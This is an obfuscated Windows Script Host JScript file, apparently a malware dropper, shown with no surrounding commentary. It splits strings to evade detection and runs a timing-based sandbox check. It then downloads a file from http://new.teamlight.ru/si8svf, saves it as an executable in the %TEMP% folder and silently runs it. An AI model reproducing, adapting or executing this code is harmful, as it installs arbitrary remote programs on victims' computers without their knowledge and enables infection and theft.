var EF = false;
var QX = "Create"+"Object";
var Y = function D() {return WScript[QX]("WScript"+".Shell");}(), NX = 11;
var X = "MSXML2"+".XMLHTTP";
var FT = 2;
var J = FT - 2;
function Q(P){Y["Run"](P, J, J);};
function Z(){return X + "";};
function PA(F0, UQ){J = J * 1; return F0 - UQ;};
function Z0(){return QX;};
/*@cc_on
  @if (@_win32 || @_win64)
    EF = true;
  @end
@*/
if (EF)
{
var AY = "";
function TJ(){return 22;};
var R = 0; var WO = 0;
function O()
{
var RJ = new this["Date"]();
var XW = RJ["getUTCMilliseconds"]();
WScript["Sleep"](TJ());
var RJ = new this["Date"]();
var B1 = RJ["getUTCMilliseconds"]();
WScript["Sleep"](TJ());
var RJ = new this["Date"]();
var GF = RJ["getUTCMilliseconds"]();
var R = "B0";
R = PA(B1, XW);
var WO = "LN";
WO = PA(GF, B1);
AY = "open";
return PA(R, WO);
}
var R0 = false;
var NJ = false;
for (var F = J; F < TJ() * 1; F++){if (O() != J){
R0 = true; 
WO = "31" + 11 * R + WO; 
NJ = true; 
break;
}}
function B() {return ((R0 == true) && (R0 == NJ)) ? 1 : J;};
if (R0 && B() && NJ){
function OV() {return Y["ExpandEnvironmentStrings"]("%TE"+"MP%/") + "rRMmMtgyu0vPyr.ex" + "e";};
 Z1 = Z();
 T = WScript[QX](Z1);
 var VP = 1;
do { 
	for (;VP;){
	try {
		if (VP == 1)
		{
			T[AY]("GET", "http://new.teamlight.ru/si8svf", false);
			T["send"]();
			SX = "Sleep";
			VP = 2;
		}
		WScript[SX](TJ() + 120); 
		if (T["readystate"] < 2 * 2) continue;
		VP = J;
		function DX(H) {var S = (1, 2, 3, 4, 5, H); return S;};
		SK = WScript[Z0()]("ADODB.Stream");
		Z1 = SK;
		Z1[AY]();
		Z1["type"] = DX(1);
		Z1["write"](T["ResponseBody"]);
		SK["position"] = DX(J);
		Z1["Save" + "ToFile"](OV(), 2);
		SK["cl"+"ose"]();
		AY0 = OV();
		Q(AY0);
	} catch(XJ){};};
}while (VP);
}
}

